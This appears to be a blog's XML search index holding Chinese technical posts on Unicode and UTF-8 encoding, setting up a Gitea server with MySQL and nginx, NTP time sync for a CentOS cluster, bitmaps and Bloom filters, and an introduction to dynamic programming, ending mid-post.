<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Unicode 编码和UTF-8编码]]></title>
    <url>%2Fposts%2F2020-07-28-Unicode-%E7%BC%96%E7%A0%81%E5%92%8CUTF-8%E7%BC%96%E7%A0%81.html</url>
    <content type="text"><![CDATA[ASCII在早起计算机中，字符是用ASCII码来表示的。ASCII码表中只有26个字母和一些其他的特殊字符和符号。下表提供了ASCII字符及其对应的十进制和十六进制的值。 从上表可以推断，在十进制数字系统中，ASCII值可以从0到127表示，让我们看一下8位字节中0和127的二进制表示形式。 0表示为 127表示为 从上面的二进制表示可以推断出，ASCII只使用了7个byte来表示0-127，但是第8位没有使用，这就使得各个编码有了不同的地方。 我们知道，如果使用第8位的话，可以表示十进制128-255，而各个国家使用128-255表示的字符不同，例如越南人使用十进制值182表示越南字母ờ，而印度使用相同的十进制值182表示印地语字母घ。因此，如果印度人写的电子邮件中包含字母घ，越南人阅读该电子邮件时，则该字母显示为ờ。这显然不是我们希望的。 Unicode and Code PointsUnicode 字符集将世界上的每个字符都映射了一个唯一的数字，这确保了不同的字母之间不会发生冲突，并且这些数字是与平台无关的。 这些唯一的数字在unicode中被称为code point。让我们看一下在Unicode中是怎样表示的。 例如在latin字符中ṍ 的code point为U+1E4D。U表示Unicode，1E4D是分配给ṍ 的十六进制值。 英文字母A的code point表示为U+0041。 如果想了解更多语言和字母的code point，参考 http://www.unicode.org/charts/ UTF-8编码既然我们知道了什么是Unicode，以及如何将世界上的每个字母分配给一个唯一的code point，我们需要一种在计算机内存中计算表示这些code point的方法。UTF-8就是其中的一种方法。 UTF-8编码是一种可变大小的编码方案，用于表示内存中unicode的code point。可变大小的编码表示根据其大小使用1、2、3、4个字节表示code point UTF-8 1 byte encodingUTF-8 1字节编码是用第一个比特位 置0 来标识。 比如英文字母A用unicode code point表示为 U+0041。它的二进制表示形式为1000001。 所以A用UTF-8 1字节编码表示为 红色的O位表示已使用1字节编码，其余位表示代码点 UTF-8 2 byte encoding拉丁字母ñ 的code point为 U+00F1,用二进制表示为11110001，该值大于使用1字节编码可以表示的最大值，因此此字母将使用UTF-8 2字节编码表示。 通过在第一个bit设置110 和 第二个bit设置10 来标识2字节编码。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[搭建自己的Git服务器-Gitea安装教程]]></title>
    <url>%2Fposts%2F2020-02-26-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84Git%E6%9C%8D%E5%8A%A1%E5%99%A8-Gitea%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B.html</url>
    <content type="text"><![CDATA[0x01 为啥要费劲的自己搭一个git服务器本人空闲时间喜欢自己鼓捣一些项目，但是又不喜欢在本地存，所有都放到github上了，最近去Github看了一下，又多又乱，github俨然成了一个demohub了，所以有了建一个自己的代码仓库管理自己代码的想法。另一方面，也由于Github的访问速度有点慢，所以说干就干，在自己的服务器上搭了这么一个gitea服务器。 调查了一些市面上的Git服务器，大概有这么三个gogs、gitlab、gitea。 gogs是使用go语言开发的一个轻量级的git服务器。 gitlab算是目前企业使用较多，也比较火的一个git自建服务应用，但是对于个人来说，服务器的配置可能跟不上。 gitea是gogs的一个克隆版本，但是相比较gogs，是采用社区进行维护的，问题解决的也比较及时。 因此我这里用gitea搭建了一个自己的git服务器，用来作为自己的一个代码仓库，一个方便管理，另一个是方便装逼。 0x02 准备工作我自己搭建的使用的存储数据库采用的是mysql，当然可以根据gitea的文档自己选择和搭建。 这里放一下gitea的官网，有需要的可以参照英文文档步骤自己搭建。 首先要安装mysql数据库，由于之前我已经安装过了，这里就不做安装步骤的，有需要的自己上网搜索。 Mysql1、 以root用户登录数据库。 12[root@renhj ~]# mysql -u root -pEnter password: 2、 创建gitea所需的数据库用户，这里我用的用户名为gitea，密码为!QAZ2wsx， 你可以用你熟悉的比较安全的密码。 如果你的gitea和mysql是在同一台服务器上，按照下面的创建： 1mysql&gt; CREATE USER 'gitea' IDENTIFIED BY '!QAZ2wsx'; 对于不在一台服务器上的，则可以按照下面的语句进行创建：1mysql&gt; CREATE USER 'gitea'@'%' IDENTIFIED BY '!QAZ2wsx'; %是对于所有外部服务器进行匹配的，如果你只想限定某一台服务器登录mysql，可以把%换成你的gitea服务器的IP地址。 3、创建gitea所需的数据库giteadb，编码用utf8mb4. 1mysql&gt; CREATE DATABASE giteadb CHARACTER SET 'utf8mb4' COLLATE 'utf8mb4_unicode_ci'; 4、授权数据库的权限。 git服务和mysql在一台服务器上的： 1mysql&gt; GRANT ALL PRIVILEGES ON giteadb.* TO 'gitea'; git服务和mysql不在一台服务器上的： 1mysql&gt; GRANT ALL PRIVILEGES ON giteadb.* TO 'gitea'@'%'; 可以把%换成你的gitea服务器的IP地址。 1mysql&gt; FLUSH PRIVILEGES; Git检查服务器上是否安装了git 12[root@renhj ~]# git --versiongit version 1.8.3.1 如果没有安装的话，用yum或者二进制包进行安装 1[root@renhj ~]# sudo yum install git -y 系统1、创建运行gitea服务的系统用户 12[root@renhj ~]# groupadd git[root@renhj ~]# adduser --system --shell /bin/bash --comment 'Git Version Control' --user-group --home-dir /home/git -m git 2、创建运行所需的目录 12345[root@renhj ~]# mkdir -p /var/lib/gitea/&#123;custom,data,log&#125;[root@renhj ~]# chown git:git /var/lib/gitea/&#123;data,indexers,log&#125;[root@renhj ~]# mkdir /etc/gitea[root@renhj ~]# chown root:git /etc/gitea/[root@renhj ~]# chmod 770 /etc/gitea/ 3、下载二进制文件 1234[root@renhj ~]# mkdir /usr/local/bin/[root@renhj ~]# cd /usr/local/bin/[root@renhj bin]# wget -O gitea https://dl.gitea.io/gitea/1.9.6/gitea-1.9.6-linux-amd64[root@renhj bin]# chmod +x gitea 4、将gitea做成服务 123456789101112131415161718[root@renhj ~]# vim /etc/systemd/system/gitea.service[Unit]Description=Gitea (Git with a cup of tea)After=network.targetRequires=mysqld.service[Service]RestartSec=2sType=simpleUser=gitGroup=gitWorkingDirectory=/var/lib/gitea/ExecStart=/usr/local/bin/gitea web -c /etc/gitea/app.iniRestart=alwaysEnvironment=USER=git HOME=/home/git GITEA_WORK_DIR=/var/lib/gitea[Install]WantedBy=multi-user.target 5、启动gitea 123[root@renhj ~]# systemctl daemon-reload [root@renhj ~]# systemctl enable gitea[root@renhj ~]# systemctl start gitea 启动之后可以通过http://[you ip]:3000进行访问，或者可以通过nginx做一个反向代理，nginx的安装这里就不写了，我把反向代理的配置贴出来。 6、nginx配置反向代理 12345678910111213[root@renhj bin]# vim /etc/nginx/conf.d/gitea.conf server &#123; listen 80; server_name git.renhj.org; location / &#123; proxy_pass http://127.0.0.1:3000/; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $remote_addr; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; &#125;&#125; 同时不要忘了在你的域名解析上加上一条git的解析。 7、注册git管理员及配置 这里已经算是安装完成了，但是gitea的管理员是没有的，数据库其他配置也没有配置。 通过访问/install页面进行配置，这里我的地址是http://git.renhj.org/install 我这里已经配置完成了，所以就不展示了，这里你配置上自己的数据库信息就行之，之后会让你进行注册，第一个注册的用户是管理员账户。 8、配置仓库地址 我查了很多网上的教程，很多教程到上一步就结束了，其实不是。还需要配置一下git代码的地址，不然你git推送和拉取都是localhost的地址。 将/etc/gitea/app.ini文件里server标签下的SSH_DOMAIN、DOMAIN、ROOT_URL都改为你自己配置的域名如下。 123456[root@renhj bin]# vim /etc/gitea/app.ini [server]SSH_DOMAIN = git.renhj.orgDOMAIN = git.renhj.orgHTTP_PORT = 3000ROOT_URL = http://git.renhj.org/ 当然还有一些配置如禁止注册、邮箱配置，我这里也不需要，就不配置了。如果你需要可以到官网上去找，或者联系我。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <tags>
        <tag>gitea</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux集群系统时间同步]]></title>
    <url>%2Fposts%2F2019-11-20-Linux%E9%9B%86%E7%BE%A4%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5.html</url>
    <content type="text"><![CDATA[前言最近学习大数据相关的知识，在学习以及搭建Hbase的时候，发现slave的机器服务器起不来，经过排查，发现是集群时间不同步的问题，借此记录一下集群做时间同步的一些解决方案. 集群配置 Host 操作系统 IP master Centos7 10.211.55.8 slave1 Centos7 10.211.55.9 slave2 Centos7 10.211.55.10 Master的作用1、Master向外网时间服务器同步时间，如中国国家授时中心服务器。这里列举几个时间同步服务器：美国标准技术院时间服务器：time.nist.gov（192.43.244.18）上海交通大学网络中心NTP服务器地址：ntp.sjtu.edu.cn（202.120.2.101）中国国家授时中心服务器地址：cn.pool.ntp.org（210.72.145.44） 2、Master作为内网时间服务器，为内网中的其他服务器提供时间同步服务，具体的架构图如下图所示。 Master的配置1、安装NTP服务 1[root@master ~]# yum install -y ntp 2、修改配置文件 123456789101112131415161718192021222324252627282930313233[root@master ~]# vim /etc/ntp.confdriftfile /var/lib/ntp/driftrestrict default kod nomodify notrap nopeer noqueryrestrict -6 default kod nomodify notrap nopeer noqueryrestrict 127.0.0.1 restrict -6 ::1# 允许10.211.55.0网段内的所有机器从这台服务器同步时间restrict 10.211.55.0 mask 255.255.255.0 nomodify notrap# 配置中国国家中心授时服务器server 0.cn.pool.ntp.orgserver 1.cn.pool.ntp.orgserver 2.cn.pool.ntp.orgserver 3.cn.pool.ntp.org# 允许上层时间服务器主动修改本机时间restrict 0.cn.pool.ntp.org nomodify notrap noqueryrestrict 1.cn.pool.ntp.org nomodify notrap noqueryrestrict 2.cn.pool.ntp.org nomodify notrap noqueryrestrict 3.cn.pool.ntp.org nomodify notrap noquery# 外部服务器不可用时，以本地时间作为时间服务server 127.0.0.1fudge 127.0.0.1 stratum 10# 同步时间后，同步到系统硬件时钟中SYNC_HWCLOCK=yesincludefile /etc/ntp/crypto/pwkeys /etc/ntp/keysdisable monitor 3、开启ntpd服务，并开机启动 12[root@master ~]# systemctl start ntpd[root@master ~]# chkconfig ntpd on 4、查看ntp的服务状态 1234[root@master ~]# ntpstat synchronised to NTP server (119.28.206.193) at stratum 3 time correct to within 76 ms polling server every 128 s 注意，启动ntp服务后一般，5-10分钟才能看到正常信息，否则在会显示服务正在启动中。 slave的配置Slave1和Slave2作为需要同步时间的客户端，向master同步时间。以下为Slave的安装及配置。 1、安装ntp服务 1[root@master ~]# yum install ntp -y 2、修改配置文件 123456789101112131415161718192021222324[root@master ~]# vim /etc/ntp.confdriftfile /var/lib/ntp/driftrestrict default kod nomodify notrap nopeer noqueryrestrict -6 default kod nomodify notrap nopeer noqueryrestrict 127.0.0.1 restrict -6 ::1# 配置时间同步服务器为内网中master机器server 10.211.55.8# 允许master主动修改本机时间restrict 10.211.55.8 nomodify notrap noquery# 外部服务器不可用时，以本地时间作为时间服务server 127.0.0.1fudge 127.0.0.1 stratum 10# 同步时间后，同步到系统硬件时钟中SYNC_HWCLOCK=yesincludefile /etc/ntp/crypto/pwkeys /etc/ntp/keysdisable monitor 3、手动同步时间 我这里是添加了host文件，所以直接用host，如果你没有添加host，需要把master换成master的ip地址。 1[root@master ~]# ntpdate -u master 4、启动时间同步服务,并设置开机启动 12[root@master ~]# systemctl start ntpd[root@master ~]# chkconfig ntpd on 结束到此集群的时间同步服务已经搭建完成，Hbase也已经可以正常启动了。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linix</tag>
        <tag>时间同步</tag>
        <tag>NTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Netty 4.x 实战（一）]]></title>
    <url>%2Fposts%2F2019-10-15-Netty-4-x-%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[生活随笔]]></title>
    <url>%2Fposts%2F2019-10-10-%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94.html</url>
    <content type="text"><![CDATA[人生就像射箭，梦想就像靶子，如果连靶子都找不到，那每天的拉弓又有什么意义？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-算法实战五]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%AE%97%E6%B3%95%E5%AE%9E%E6%88%98%E4%BA%94.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-算法实战四]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%AE%97%E6%B3%95%E5%AE%9E%E6%88%98%E5%9B%9B.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-算法实战三]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%AE%97%E6%B3%95%E5%AE%9E%E6%88%98%E4%B8%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-算法实战二]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%AE%97%E6%B3%95%E5%AE%9E%E6%88%98%E4%BA%8C.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-算法实战一]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%AE%97%E6%B3%95%E5%AE%9E%E6%88%98%E4%B8%80.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-并行算法]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%B9%B6%E8%A1%8C%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-索引]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%B4%A2%E5%BC%95.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-搜索算法]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-B+树]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-B-%E6%A0%91.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-向量空间]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%90%91%E9%87%8F%E7%A9%BA%E9%97%B4.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-概率统计]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-位图算法：如何实现网页爬虫中的URL去重功能]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[前言 网页爬虫是搜索引擎中非常重要的系统，负责几十亿、上百亿的网页。爬虫的工作原理是，通过解析已经爬取的页面中的网页链接，然后再爬取这些链接对应的网页。而同一网页链接有可能被包含在多个页面中，这就会导致爬虫算法在爬取的过程中，重复爬取相同的网页。如果你是一名负责爬虫的工程师，你会如何避免这些重复的爬取呢？ 最容易想到的方法是，我们记录已经爬取的网页链接，再爬取一个新的网页之前，我们拿它的链接，在已经爬取的网页链接到表中搜索，如果存在，那就说明这个网页已经被爬取过了；如果不存在，那就说明这个网页链接没有被爬取过，可以继续去爬取。等爬取到这个网页之后，我们将这个网页的链接添加到已经爬取的网页链接列表里。 思路非常简单，我想你应该很容易就能想到，但是如何存储已经爬取的链接呢？需要重什么样的数据结构？ 算法解析 我们先来回顾下，是否可以用我们之前学过的数据结构来解决？ 这个问题要处理的对象是网页链接，也就是URL，要支持的操作有两个，添加一个URL和查找一个URL。除了这两个功能性的要求之外，在非功能性方面，我们还要求这两个操作的执行效率要尽可能高。除此之外，我们要处理的是上亿的网页链接，内存消耗会非常大，所以在存储效率上，我们要尽可能的高效。 我们回想一下，满足这些条件的数据结构有哪些？显然，散列表、红黑树、跳表这些动态数据结构，都能够支持快速插入、查找数据，但是对内存消耗方面，是否可以结构呢？ 我们拿散列表来举例。假设我们要爬取10亿个网页（像google、百度这样的通用搜索引擎，爬取的网页可能会更多），为了判重，我们把着10亿个URL存储在散列表中，你来估算下，需要多少内存？ 假设一个URL的平均长度是64字节，那单纯存储着10亿个URL就需要大约60GB内存空间。因为散列表需要维持较小的散列因子，才能保证不会出现过多的散列冲突，导致性能下降。而且用链表法解决冲突的散列，还需要存储链表指针，所以，如果用这10亿个URL构建的散列表，需要的内存会远远大于60GB，有可能会超过100GB。 当然，对于一个大型的搜索引擎来说，即便是100GB的内存要求，其实也不算太高，我们可以采用分治的思想，用多台机器（比如20台8GB的机器）来存储这10亿URL，这种分治的思想，我们前面讲过很多次，这里就不详细说了。 对于爬虫的URL去重这个问题，刚刚讲的分治加散列表的思想，已经可以实实在在的工作了。不过作为一个有追求的工程师，我们应该考虑，在添加、查询数据的效率以及内存消耗方面，我们是否还有进一步的优化空间呢？ 你可能会说，散列表中添加、查找数据的时间复杂度都是O(1)，还有进一步优化的空间吗？实际上我们前面也说过，时间复杂度并不能代表代码的执行时间。大O时间复杂度表示法，会忽略掉常数、系数和低阶，并且统计的是语句的频度。不同的语句，执行的时间是不同的，时间复杂度只能表示执行时间随着数据规模的变化趋势，并不能度量在特定的数据规模下，代码具体执行的时间多少。 如果时间复杂度中原来的系数是10，我们现在通过优化，将系数降为1，那在时间复杂度没有变化的情况下，执行效率就提高了10倍。对于实际的软件开发来说，10倍效率的提升，显然是一个非常值得的优化。 如果我们用基于链表的方法解决散列冲突，散列表中存储的是URL，那当查询的时候，通过哈希函数定位为某个链表之后，我们还需要依次对比每个链表中的URL，这个操作是比较耗时的，主要有两点原因。 一方面，链表中的节点在内存中不是连续的，所以不能一下子加载CPU缓存中，没法很好的利用CPU高速缓存，所以数据访问性方面会大大降低。 另一方面，链表中的每个数据都是URL，而URL不是简单的数字，是平均长度为64字节的字符串，也就是说，我们要让待判重的URL，根链表中的每个URL，做字符串匹配。显然，这样一个字符串匹配操作，比起单纯的数字来说，要慢很多。 所以，基于这两点，执行效率方面肯定还是有优化空间的。 对于内存消耗方面的优化，除了刚刚这种基于散列表的解决方案之外，貌似没有更好的法子了。实际上，如果想要在内存方面有明显的节省，那就得换一种解决方案了，也就是我们今天要重点将的这种存储结构，布隆过滤器（Bloom Filter）。 在讲布隆过滤器之前，我们想讲一下另一种存储结构，位图（BitMap）。因为，布隆过滤器本身就是基于位图的，是对位图的一种改进。 我们先来看一个跟开篇的问题非常类似，但稍微简单的问题。我们有1千万个整数，整数的范围在1到1亿之间，如何快速查找某个整数是否在这1千万个整数中？ 当然，这个问题还是可以用散列表解决，不过，我们还可以使用一种比较特殊的散列表，那就是位图。我们申请一个大小为1亿、数据类型为布尔类型的数组。我们将这一千万个整数作为数组下标，将对应的数组值设成true。比如，整数5对应的下标为5的数组值设成true，也就是array[5] = true。 当我们查询某个整数K是否在这1千万个整数中的时候，我们只需要将对应的数组值array[k] 取出来，看是否等于true。如果等于true，说明1千万整数中包含这个整数k，相反，就表示不包含这个整数k。 不过，很多语言中提供的布尔类型，大小是1个字节，并不能节省太多内存空间。实际上，表示true和false两个值，我们只需要用一个二进制位bit表示就可以了。那如何通过编程语言，来表示一个二进制位呢？ 这里就要用到位运算了。我们可以借助编程语言中提供的数据类型，比如int、long、char等类型，通过位运算，用其中的某个位表示某个数字。文字描述起来有点不好理解，我把位图的代码写了出来，你可以对照代码看下，应该就能懂了。 123456789101112131415161718192021222324252627282930313233343536package org.renhj.bitmap;import java.util.Random;public class BitMap &#123; private char[] chars; private int nBits; BitMap(int nBits)&#123; this.nBits = nBits; this.chars = new char[nBits/16 + 1]; &#125; public void set(int k) &#123; if (k &gt; nBits) return; int byteIndex = k/16; int bitIndex = k%16; chars[byteIndex] |= (1&lt;&lt; bitIndex); &#125; public boolean get(int k) &#123; if (k&gt;nBits) return false; int byteIndex = k/16; int bitIndex = k%16; return (chars[byteIndex] &amp; (1&lt;&lt;bitIndex)) != 0; &#125; public static void main(String[] args) &#123; BitMap bitMap = new BitMap(1000); for (int i = 0; i &lt; 100; i++) &#123; bitMap.set(new Random().nextInt(100)); &#125; &#125;&#125; 从刚刚位图结构的讲解中，你应该可以发现，位图通过数组下标来定位数据，所以访问效率非常高，而且，每个数字用一个二进制位来表示，在数字范围不大的情况下，所需要的内存空间非常节省。 比如刚刚的例子，如果用散列表存储这1千万的数据，数据是32位的整型，也就是需要4个字节的存储空间，那总共至少需要40MB的存储空间，如果我们通过位图的话，数字范围在1到1亿之间，只需要1亿个二进制位，也就是12MB左右的存储空间就够了。 关于位图，我们就讲完了，是不是很简单？不过，这里我们有个假设，就是数字所在的范围不是很大，如果数字的范围很大，比如刚刚那个问题，数字范围不是1到1亿，而是1到10亿，那位图的大小就是10亿个二进制位，也就是120MB大小，消耗的内存空间，不降反增。 这个时候，布隆过滤器就出场了。布隆过滤器就是为了解决刚刚这个问题，对位图这种数据结构的一种改进。 还是刚刚那个例子，数据个数是一千万，数据的范围是1到1亿，布隆过滤器的做法是，我们仍然使用一个1亿个二进制大小的位图，然后通过哈希函数，对数字进行处理，让它落在这1到1亿范围内，比如我们把哈希函数设计成f(x)=x%n。其中，x表示数字，n表示位图的大小(1亿)，也就是，对数字跟位图的大小取模求余。 不过，你肯定会说，哈希函数会存在冲突的问题，一亿零一和1两个数字，经过你刚刚那个取模求余的哈希函数之后，最后的处理结果都是1。这样我就无法区分，位图存储的是1还是一亿零一了。 为了降低这种冲突概率，当然我们可以设计一个复杂点、随机点的哈希函数。除此之外，还有其他方法吗？我们来看看布隆过滤器的处理方法。既然一个哈希函数可能会存在冲突，那用多个哈希函数一块定位一个数据，是否能降低冲突的概率呢？我来具体解释一下，布隆过滤器是怎么做的。 我们使用k个哈希函数，对同一个数字进行哈希求值，那会得到k个不同的哈希值，我们分别记做X1、X2、X3、。。。 Xk。我们把这k个数字作为位图中的下标，将对应的Bitmap[X1]、Bitmap[X2]、Bitmap[X3]、… Bitmap[Xk] 都设置成True，也就是说，我们用k个二进制位，来表示一个数字的存在。 当我们需要查询某个数字是否存在的时候，我们用同样的k个哈希函数，对这个数字求哈希值，分别得到Y1、Y2、Y3、… Yk。我们看这k个哈希值，对应位图中的数值是否都为True，如果都是True，则说明这个数字存在，如果有其中一个不为True，这说明这个数字不存在。 对于两个不同的数字来说，经过一个哈希函数的处理之后，可能会产生相同的哈希值，但是经过k个哈希函数处理后，k个哈希值都相同的概率就非常低了。尽管采用k个哈希函数之后，两个数字哈希冲突的概率降低了，但是这种处理方式又带来了新的问题，那就是容易误判， 布隆过滤器的误判又一个特点，那就是，它只会对存在的情况有误判。如果某个数字经过布隆过滤器判断不存在，那说明这个数字是真的不存在；如果某个数字经过布隆过滤器判断存在，这个时候才可能回出现误判，有可能并不存在。不过，只要我们调整哈希函数的个数、位图大小跟要存储数字的个数之间的比例，那就可以将这种误判降到非常低。 尽管布隆过滤器会存在误判，但是这并不影响它的应用。在很多场景中，对于误判有一定的容忍度。比如我们今天要解决的爬虫去重的问题，即使一个没有被爬取过的网页，被误判为已经爬取过，对于搜索引擎来说，也不是什么大事，是可以容忍的，毕竟网页太多了，搜索引擎也不可能都爬取到。 弄懂了布隆过滤器，我们今天的爬虫网页去重问题就非常简单了。 我们用布隆过滤器来记录已经爬取过的网页链接，假设需要判重的网页有10亿，那我们可以用一个10倍大小的位图来存储，也就是100亿个二进制位，换算成字节，那就是大约1.2GB。之前我们用散列表判重，需要至少100GB的空间，相比来讲，布隆过滤器在存储空间上的消耗，降低了非常多。 那我们再来看下，利用布隆过滤器，在执行效率方面，是否比散列表更加高效呢？ 布隆过滤器用多个哈希函数对同一个网页链接进行处，CPU只需要将网页链接从内存中读取一次，进行多次哈希计算，理论上讲这组操作是CPU密集型的。而在散列表的处理方式中，需要读取散列冲突拉链的多个网页链接，分别跟待判重的网页链接，进行字符串匹配。这个操作涉及很多内存数据的读取，所以是内存密集型的。我们知道CPU计算可能是要比内存访问更快速的，所以理论上讲，布隆过滤器的判重方式，更加快速。 总结引申 今天，关于搜索引擎爬虫网页去重问题的解决，我们从散列表讲到位图，在讲到布隆过滤器。布隆过滤器非常适合这种不需要100%准确的、允许存在小概率误判的大规模判重场景。除了爬虫网页去重这个例子，还有比如统计一个大型网站的每天UV数，也就是每天有多少用户访问了网站，我们就可以使用布隆过滤器，对重复访问的用户，进行去重。 我们前面讲到，布隆过滤器的误判率，主要跟哈希函数的个数、位图的大小有关。当我们往布隆过滤器中不停的加入数据之后，位图中不是true的位置就越来越少了，误判率就越来越高了，所以，对于无法事先知道数据个数的情况，我们需要支持自动扩容这个功能。 当布隆过滤器中，数据个数与位图大小的比例超过某个阈值的时候，我们就重新申请一个新的位图。后面来的数据，会被放置到新的位图中。但是，如果我们要判断某个数据是否在布隆过滤器中，我们就需要查看多个位图，相应的执行效率就降低了一下。 位图、布隆过滤器应用如此广泛，很多编程语言都已经实现了。比如Java的BitSet类就是一个位图，Redis也提供了BitMap位图类，Google的Guava工具包提供了BloomFliter布隆过滤器的实现。如果你感兴趣，可以去研究下这些源码。 课后思考 假设我们有1亿个整数，整数范围是从1到10亿，如何快速并且省内存的给这1亿个数据从小到大排序 还记得我们在哈希函数中就讲过的分治思想，用散列表记忆哈希函数，实现海量图库中的判重功能？如果我们允许小概率的误判，那是否可以用今天的布隆过滤器来解决呢？你可以参照我们当时的评估算法，重新评估下，用布隆过滤器需要多少台机器？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>位图</tag>
        <tag>布隆过滤器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-最短路径]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-拓扑排序]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-动态规划实战]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%AE%9E%E6%88%98.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-动态规划理论]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%90%86%E8%AE%BA.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-初识动态规划:如何巧妙解决“双十一”购物时的凑单问题]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%88%9D%E8%AF%86%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.html</url>
    <content type="text"><![CDATA[前言 淘宝的双十一购物节有各种促销活动，比如“满200减20元”，假如你的购物车中有n（&gt;100）个商品，在凑够满减条件的情况下，让选出来的商品价格中和最大程度的接近满减条件，这样就可以极大限度的“薅羊毛”。怎么通过编程来解决这个问题吗？ 要想解决这个问题，就要用到我们今天讲的动态规划（Dynamic Programming）。 动态规划学习路线 动态规划比较适合用来求解最优问题，比如求最大值、最小值等。它可以非常显著的降低时间复杂度，提高代码的执行效率。不过，它也是出了名的难学。它的主要学习难点跟递归类似，求解问题的过程不太符合人类常规的思维习惯。对于新手来说，想要入门确实不容易，不过，等你掌握之后，你会发现，实际上并没有想象中那么难。 为了更容易理解动态规划，我分了三节给你讲解，这三节内容分别是，初识动态规划、动态规划理论、动态规划实战。 第一节，我们通过两个非常经典的动态规划问题模型，向你展示为什么需要动态规划，以及动态规划解题方法是如何演化出来的。实际上，你只要掌握了这两个例子的解题思路，其他很多动态规划问题，你都可以套用类似的思路来解决。 第二节，我会总结动态规划适合解决的问题的特征、以及动态规划解题思路。除此之外，我还会将贪心、分治、回朔、动态规划这四种算法思想放在一起，对比分析他们各自的特点以及适用的场景。 